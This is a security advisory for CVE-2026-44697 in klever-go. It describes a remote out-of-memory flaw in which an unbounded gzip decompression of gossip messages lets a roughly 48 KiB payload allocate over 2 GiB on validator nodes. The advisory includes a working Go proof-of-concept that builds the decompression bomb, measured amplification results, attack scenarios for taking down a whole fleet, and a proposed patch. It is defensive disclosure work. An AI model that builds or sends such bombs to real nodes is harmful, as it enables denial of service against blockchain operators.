# [H] Klever-Go MultiDataInterceptor has remote OOM via crafted compressed P2P payload

## Summary
Severity: High
Advisory: GHSA-87m7-qffr-542v
CVE: CVE-2026-44697
CWE: CWE-409, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-87m7-qffr-542v
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0

## Details
## Summary

A remote, unauthenticated denial-of-service vulnerability in
`Batch.Decompress` (`data/batch/batch.go`) allows any peer that
participates in a topic served by `MultiDataInterceptor` to allocate
multi-gigabyte heaps on the receiving node from a sub-50 KiB gossip
payload. A single packet is sufficient to OOM-kill a validator with
conventional memory provisioning. Fleet-wide application affects chain
liveness.

The vulnerability was identified during an internal security review of
`core/process/interceptors/multiDataInterceptor.go` at commit
`405d01b0abbf0d3e73b4a990bd7394a01f200dc2`. It is distinct from, and
substantially more severe than, the throttler-slot-leak vulnerability
disclosed in `GHSA-74m6-4hjp-7226`. Both reports cover adjacent code in
the same call path; the patches must land together in one release
(rc2 superseding rc1).

Two additional, lower-severity hardening issues affecting the same code
path are documented in this report and remediated by the same patch.
They are not independently exploitable under the default deployed
anti-flood configuration and are not requested as separate CVEs.

## Description

`MultiDataInterceptor.ProcessReceivedMessage`
(`core/process/interceptors/multiDataInterceptor.go:79`) handles every
gossip message received on the topics the interceptor is registered for.
At lines 95–102 it conditionally decompresses the payload via
`Batch.Decompress`:

```go
if b.IsCompressed {
    err = b.Decompress(mdi.marshalizer)
    if err != nil { ... return err }
}
```

`Batch.Decompress` (`data/batch/batch.go:109`) delegates the gzip step to
`decompressGzip` (`data/batch/batch.go:35-53`), which performs an
unbounded `io.ReadAll` on the gzip reader:

```go
func decompressGzip(data []byte) ([]byte, error) {
    rdata := bytes.NewReader(data)
    reader, err := gzip.NewReader(rdata)
    if err != nil { return nil, err }
    result, err := io.ReadAll(reader)   // no LimitReader, no DataSize check
    ...
}
```

After the gzip step succeeds, `Decompress` re-`Unmarshal`s the inflated
bytes back into the `Batch` value, again with no size cap. The
attacker-set `ba.DataSize` field is never validated on decompression, so
the lie is free.

The order of operations in `ProcessReceivedMessage`:

```
preProcessMessage              -> anti-flood by COMPRESSED size only
marshalizer.Unmarshal(&b, ..)  -> outer Batch (small, cheap)
b.Decompress(...)              -> UNBOUNDED here  (bomb explodes)
... b.Data populated with N entries ...
antiflood.CanProcessMessagesOnTopic(..., uint32(len(b.Data)), ...)
```

The count-budget anti-flood check at line 111 runs *after* `Decompress`
completes, so no anti-flood configuration can prevent the explosion. The
only gate above `Decompress` is `preProcessMessage`'s byte budget, which
sees only the *compressed* payload size and is trivially satisfied by a
sub-MB bomb.

## Proof of Concept

The PoC is a self-contained Go test that exercises the real
`data/batch.Batch.Decompress` function and the production
`factory.ProtoMarshalizer`. No mocks. Both the attacker-side construction
(marshal a `Batch` of millions of empty entries, gzip, wrap in an outer
compressed `Batch`) and the receiver-side path (`mrs.Unmarshal` → 
`received.Decompress(mrs)`) are exactly what runs in production at the
reviewed commit.

The headline test (`TestC2_DecompressionBomb_ValidInner`) constructs a
~48 KiB outer wire payload that decompresses to 25 million `[]byte`
entries, and samples `runtime.HeapAlloc` every 5 ms during `Decompress`
to capture the peak (since the inflated buffer is freed once `Decompress`
returns).

### Test source

Place the file under `playground/p2pflood/c2_decompression_bomb_test.go`
in a checkout of the reviewed commit, then run:

```
go test -v -count=1 -timeout=120s -run TestC2 ./playground/p2pflood/...
```

```go
package p2pflood_test

import (
	"bytes"
	"compress/gzip"
	"runtime"
	"sync/atomic"
	"testing"
	"time"

	"github.com/klever-io/klever-go/data/batch"
	"github.com/klever-io/klever-go/tools/marshal/factory"
)

const inflatedSize = 256 << 20 // 256 MiB

// buildGzipOfZeros: streams `size` zero bytes through a gzip writer.
// A real attacker produces this offline; the streaming form here keeps
// the test's own attacker-side allocation small.
func buildGzipOfZeros(t *testing.T, size int) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	chunk := make([]byte, 1<<20)
	for written := 0; written < size; {
		n := len(chunk)
		if size-written < n {
			n = size - written
		}
		if _, err := gz.Write(chunk[:n]); err != nil {
			t.Fatalf("gzip write: %v", err)
		}
		written += n
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gzip close: %v", err)
	}
	return buf.Bytes()
}

// peakHeapDuring samples runtime.HeapAlloc every 5 ms during fn() and
// returns (peak, baseline). In-flight sampling is required because
// Decompress's internal allocations may be reclaimed by GC before the
// function returns.
func peakHeapDuring(fn func()) (peak, baseline uint64) {
	runtime.GC()
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	baseline = ms.HeapAlloc

	var stop atomic.Bool
	peakPtr := new(atomic.Uint64)
	peakPtr.Store(baseline)
	done := make(chan struct{})
	go func() {
		ticker := time.NewTicker(5 * time.Millisecond)
		defer ticker.Stop()
		var s runtime.MemStats
		for !stop.Load() {
			runtime.ReadMemStats(&s)
			cur := s.HeapAlloc
			for {
				old := peakPtr.Load()
				if cur <= old || peakPtr.CompareAndSwap(old, cur) {
					break
				}
			}
			<-ticker.C
		}
		close(done)
	}()

	fn()

	stop.Store(true)
	<-done
	return peakPtr.Load(), baseline
}

// TestC2_DecompressionBomb_RawZeros: floor-of-attack demonstration.
// All-zeros inflated payload; inner Unmarshal-after-decompress fails,
// but the gzip output buffer is already allocated.
func TestC2_DecompressionBomb_RawZeros(t *testing.T) {
	mrs, err := factory.NewMarshalizer(factory.ProtoMarshalizer)
	if err != nil {
		t.Fatalf("marshalizer: %v", err)
	}

	bombStream := buildGzipOfZeros(t, inflatedSize)

	bomb := &batch.Batch{
		IsCompressed: true,
		Algo:         batch.CType_GZip,
		Stream:       bombStream,
		DataSize:     1, // a lie — Decompress ignores it
	}
	wire, err := mrs.Marshal(bomb)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	t.Logf("  wire payload (after Marshal): %d bytes (%.2f KiB)",
		len(wire), float64(len(wire))/1024.0)
	t.Logf("  advertised DataSize:          %d", bomb.DataSize)
	t.Logf("  actual decompressed size:     %d bytes (%.2f MiB)",
		inflatedSize, float64(inflatedSize)/(1<<20))

	bomb = nil
	bombStream = nil
	runtime.GC()

	received := &batch.Batch{}
	if err := mrs.Unmarshal(received, wire); err != nil {
		t.Fatalf("receiver outer unmarshal: %v", err)
	}
	if !received.IsCompressed {
		t.Fatalf("expected IsCompressed=true after outer unmarshal")
	}

	start := time.Now()
	var decompressErr error
	peak, baseline := peakHeapDuring(func() {
		decompressErr = received.Decompress(mrs)
	})
	elapsed := time.Since(start)

	allocated := peak - baseline
	amp := float64(allocated) / float64(len(wire))
	t.Logf("  Decompress error: %v (irrelevant — heap already allocated)", decompressErr)
	t.Logf("  peak heap during Decompress: +%d bytes (%.2f MiB)",
		allocated, float64(allocated)/(1<<20))
	t.Logf("  elapsed: %v", elapsed)
	t.Logf("  amplification: %.0fx (wire -> heap)", amp)

	if allocated < uint64(inflatedSize/2) {
		t.Fatalf("heap delta only %.2f MiB — vuln may already be patched",
			float64(allocated)/(1<<20))
	}
	if amp < 100 {
		t.Fatalf("amplification only %.1fx — expected >>100x", amp)
	}
}

// TestC2_DecompressionBomb_ValidInner: realistic ceiling — gzip stream
// decompresses to a valid marshaled Batch with N=25M empty entries.
// Decompress's internal Unmarshal succeeds and additionally allocates
// the [][]byte slice. All before any count-based anti-flood runs.
func TestC2_DecompressionBomb_ValidInner(t *testing.T) {
	mrs, err := factory.NewMarshalizer(factory.ProtoMarshalizer)
	if err != nil {
		t.Fatalf("marshalizer: %v", err)
	}

	const N = 25_000_000

	innerBatch := &batch.Batch{Data: make([][]byte, N)}
	innerWire, err := mrs.Marshal(innerBatch)
	if err != nil {
		t.Fatalf("inner marshal: %v", err)
	}
	innerBatch = nil
	runtime.GC()

	var compressed bytes.Buffer
	gz := gzip.NewWriter(&compressed)
	if _, err := gz.Write(innerWire); err != nil {
		t.Fatalf("gz write: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gz close: %v", err)
	}
	innerWireLen := len(innerWire)
	innerWire = nil
	runtime.GC()

	bomb := &batch.Batch{
		IsCompressed: true,
		Algo:         batch.CType_GZip,
		Stream:       compressed.Bytes(),
		DataSize:     1,
	}
	wire, err := mrs.Marshal(bomb)
	if err != nil {
		t.Fatalf("outer marshal: %v", err)
	}
	t.Logf("  inner wire (uncompressed):    %d bytes (%.2f MiB)",
		innerWireLen, float64(innerWireLen)/(1<<20))
	t.Logf("  outer wire (gzip-wrapped):    %d bytes (%.2f KiB)",
		len(wire), float64(len(wire))/1024.0)
	t.Logf("  inner -> outer compression:   %.0fx",
		float64(innerWireLen)/float64(len(wire)))

	bomb = nil
	compressed.Reset()
	runtime.GC()

	received := &batch.Batch{}
	if err := mrs.Unmarshal(received, wire); err != nil {
		t.Fatalf("receiver outer unmarshal: %v", err)
	}

	start := time.Now()
	var decompressErr error
	peak, baseline := peakHeapDuring(func() {
		// Mirrors multiDataInterceptor.go:96 exactly. Runs BEFORE the
		// count-budget anti-flood at line 111.
		decompressErr = received.Decompress(mrs)
	})
	elapsed := time.Since(start)

	allocated := peak - baseline
	amp := float64(allocated) / float64(len(wire))
	t.Logf("  Decompress returned: %v", decompressErr)
	t.Logf("  Decompressed b.Data length: %d (matches N=%d? %v)",
		len(received.Data), N, len(received.Data) == N)
	t.Logf("  peak heap during Decompress: +%d bytes (%.2f MiB)",
		allocated, float64(allocated)/(1<<20))
	t.Logf("  elapsed: %v", elapsed)
	t.Logf("  amplification: %.0fx (wire -> heap)", amp)

	if decompressErr != nil {
		t.Fatalf("Decompress unexpectedly failed: %v", decompressErr)
	}
	if len(received.Data) != N {
		t.Fatalf("inner Unmarshal lost entries: got %d want %d",
			len(received.Data), N)
	}
	if allocated < 256<<20 {
		t.Fatalf("heap delta only %.2f MiB — expected >256 MiB",
			float64(allocated)/(1<<20))
	}
	runtime.KeepAlive(received)
}
```

### Measured output

Apple-silicon dev machine, `go 1.25`, against commit
`405d01b0abbf0d3e73b4a990bd7394a01f200dc2`:

```
=== RUN   TestC2_DecompressionBomb_RawZeros
      wire payload (after Marshal): 260938 bytes (254.82 KiB)
      advertised DataSize:          1
      actual decompressed size:     268435456 bytes (256.00 MiB)
      Decompress error: proto: cannot parse invalid wire-format data (irrelevant — heap already allocated)
      peak heap during Decompress: +887994584 bytes (846.86 MiB)
      elapsed: 155.79ms
      amplification: 3403x (wire -> heap)
--- PASS: TestC2_DecompressionBomb_RawZeros (0.52s)

=== RUN   TestC2_DecompressionBomb_ValidInner
      inner wire (uncompressed):    50000000 bytes (47.68 MiB)
      outer wire (gzip-wrapped):    48642 bytes (47.50 KiB)
      inner -> outer compression:   1028x
      Decompress returned: <nil>
      Decompressed b.Data length: 25000000 (matches N=25000000? true)
      peak heap during Decompress: +2218262232 bytes (2115.50 MiB)
      elapsed: 582.92ms
      amplification: 45604x (wire -> heap)
--- PASS: TestC2_DecompressionBomb_ValidInner (0.75s)
```

Reproduction: any commit that includes `data/batch/batch.go` in its
current `decompressGzip`/`Decompress` form. The PoC does not depend on
libp2p, the live interceptor stack, or any deployed configuration — the
bug is in `Batch.Decompress` itself; any caller that reaches it pays
for the unbounded allocation.

The PoC sources (along with a companion test for the bundled
slice-prealloc finding) live under `playground/p2pflood/` on the
maintainer's local workstation and have not been pushed to any branch.
They will be converted into a regression-test suite alongside the patch
in the private fork.

## Impact

A single connected peer publishing on a topic served by
`MultiDataInterceptor` (which on a public chain includes any anonymous
gossip publisher) can cause the receiving node to allocate 2+ GiB of
heap in under one second per packet.

With the default deployed configuration
(`peerMaxInput.totalSizePerInterval: 4194304` = 4 MiB/s per peer), an
attacker can ship roughly 80 such bombs per second per connected peer
before tripping the per-peer byte budget. The per-peer message count
limit (`baseMessagesPerInterval: 140` per fastReacting interval, 1000
before blacklisting) is high enough to permit the attack to run for
several seconds before any blacklist activates. By that point the node
process is already OOM-killed.

Realistic attack scenarios:

* A single attacker connected to one validator can OOM that validator
  in under a second (one bomb suffices on memory-constrained nodes).
* A small number of malicious peers spread across the validator fleet
  can OOM the entire fleet within a single block-production interval,
  affecting chain liveness.
* Eclipse-attack composition: the cost is paid before any peer
  reputation logic runs, so the attack works regardless of whether the
  receiver attributes the message to originator or relayer.

## Affected Code

* `data/batch/batch.go:35-53`   — `decompressGzip`, unbounded `io.ReadAll`
* `data/batch/batch.go:109-137` — `Batch.Decompress`, ignores `DataSize`,
                                   re-`Unmarshal`s inflated bytes
* `core/process/interceptors/multiDataInterceptor.go:95-102` — call site
* `core/process/interceptors/multiDataInterceptor.go:84-94`  — preceding
                                   `Unmarshal` step

## Patches

A patch is in preparation on a private branch and will land in rc2,
together with the fix for `GHSA-74m6-4hjp-7226`. The intended fix
shape:

```go
const maxInflatedBatch = 64 * 1024 * 1024 // 64 MiB hard ceiling; tune per topic

func decompressGzip(data []byte, max int64) ([]byte, error) {
    r, err := gzip.NewReader(bytes.NewReader(data))
    if err != nil { return nil, err }
    defer r.Close()
    lr := io.LimitReader(r, max+1)
    out, err := io.ReadAll(lr)
    if err != nil { return nil, err }
    if int64(len(out)) > max {
        return nil, ErrDecompressionTooLarge
    }
    return out, nil
}

func (ba *Batch) Decompress(m marshal.Marshalizer) error {
    if !ba.IsCompressed { return common.ErrNotCompressed }
    if ba.DataSize > maxInflatedBatch {
        return ErrDecompressionTooLarge
    }
    result, err := decompressGzip(ba.Stream, maxInflatedBatch)
    if err != nil { return err }
    if int64(len(result)) != int64(ba.DataSize) && ba.DataSize > 0 {
        return ErrDecompressedSizeMismatch
    }
    if err := m.Unmarshal(ba, result); err != nil { return err }
    ba.Stream, ba.IsCompressed = nil, false
    return nil
}
```

The cap value should be selected per topic. A 64 MiB ceiling preserves
backward compatibility for legitimate large batches while reducing the
worst-case allocation by ≈30× relative to the measured PoC and ≈400×
relative to the upper bound of an uncapped attack.

A regression test based on the PoC will accompany the patch.

## Workarounds

None at the configuration level. The `peerMaxInput.totalSizePerInterval`
budget could theoretically be lowered, but as the PoC measurements show,
a single bomb is already lethal on memory-constrained nodes. Patch is
required.

## Bundled Hardening (no separate CVE)

The following two issues were identified in the same call path during
the review. They are not independently exploitable under the default
deployed `defaultMaxMessagesPerSec: 35000` per-topic anti-flood limit
and so do not warrant their own CVEs. They are remediated by the same
patch as the headline vulnerability and are documented here for
transparency.

### Bundled #1 — Slice pre-allocation amplification (CWE-789, CWE-770)

`multiDataInterceptor.go:123` performs:

```go
listInterceptedData := make([]process.InterceptedData, len(multiDataBuff))
```

`len(multiDataBuff)` is `len(b.Data)` after `Unmarshal` and `Decompress`,
both of which are attacker-controlled. Under the default per-topic
count budget this is bounded; a deployer who loosens that budget, or
any future code path that bypasses it, would expose ≈16 bytes ×
attacker-chosen-N of allocation. The same patch caps `len(b.Data)`
immediately after `Unmarshal`, again after `Decompress`, and before the
make.

The unconditional component of this finding — that `Decompress`'s
internal `Unmarshal` populates `b.Data` with N `[]byte` slice headers
(24 B each) before any count-budget check runs — is captured by the
headline finding's PoC.

### Bundled #2 — Self-message anti-flood bypass (CWE-290, CWE-693)

`baseDataInterceptor.go:32` exempts messages from anti-flood enforcement
when:

```go
bytes.Equal(m.Signature(), m.From()) &&
bytes.Equal(m.From(), bdi.currentPeerID.Bytes()) &&
fromConnectedPeer == bdi.currentPeerID
```

The first equality is a sentinel byte comparison, not a cryptographic
check. Exploitability depends on whether the upstream libp2p stack
verifies envelope signatures before reaching `preProcessMessage`. The
patch replaces the sentinel with a defense-in-depth check and ensures
throttler accounting still runs on the self-message path.

## Coordination with `GHSA-74m6-4hjp-7226`

The maintainer team is concurrently handling `GHSA-74m6-4hjp-7226`,
which discloses an adjacent throttler-slot-leak finding in the same
`ProcessReceivedMessage` function. The two CVEs are independently
fixable per CNA Operational Rules, but operationally the patches must
land in one release. rc2 will supersede rc1 and contain fixes for both
advisories. Validators upgrade once.


## Credits

Fernando Sobreira (maintainer, internal security review).

## References

* Reviewed commit: `405d01b0abbf0d3e73b4a990bd7394a01f200dc2`
* Related advisory: `GHSA-74m6-4hjp-7226`
* CWE-409: https://cwe.mitre.org/data/definitions/409.html
* CWE-770: https://cwe.mitre.org/data/definitions/770.html

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-87m7-qffr-542v
- https://nvd.nist.gov/vuln/detail/CVE-2026-44697
- https://github.com/klever-io/klever-go
